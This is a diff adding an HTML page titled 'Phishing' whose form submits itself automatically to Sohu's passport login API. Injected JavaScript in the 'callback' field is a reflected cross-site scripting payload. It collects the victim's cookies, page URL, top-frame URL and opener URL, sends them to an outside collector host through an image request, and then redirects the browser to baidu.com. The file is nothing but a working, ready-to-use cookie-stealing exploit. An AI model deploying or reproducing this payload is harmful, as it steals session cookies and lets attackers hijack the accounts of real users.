@@ -1,0 +1,40 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>Phishing</title>
+</head>
+<body>
+    <form method="post" action="http://passport.sohu.com/apiv2/login" id='xss'>
+        <input name="domain" value="sohu.com">
+        <input name="callback" value="passport20003776568760853283;(new Image()).src = 'http://www.tongtianqi.com/xss/?location=' + escape((function () {
+                try {
+                    return document.location.href
+                } catch (e) {
+                    return ''
+                }
+            })()) + '&toplocation=' + escape((function () {
+                try {
+                    return top.location.href
+                } catch (e) {
+                    return ''
+                }
+            })()) + '&cookie=' + escape((function () {
+                try {
+                    return document.cookie
+                } catch (e) {
+                    return ''
+                }
+            })()) + '&opener=' + escape((function () {
+                try {
+                    return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
+                } catch (e) {
+                    return ''
+                }
+            })());window.location.href='http://www.baidu.com';console.log">
+    </form>
+    <script type="text/javascript">
+        document.getElementById('xss').submit();
+    </script>
+</body>
+
+</html>
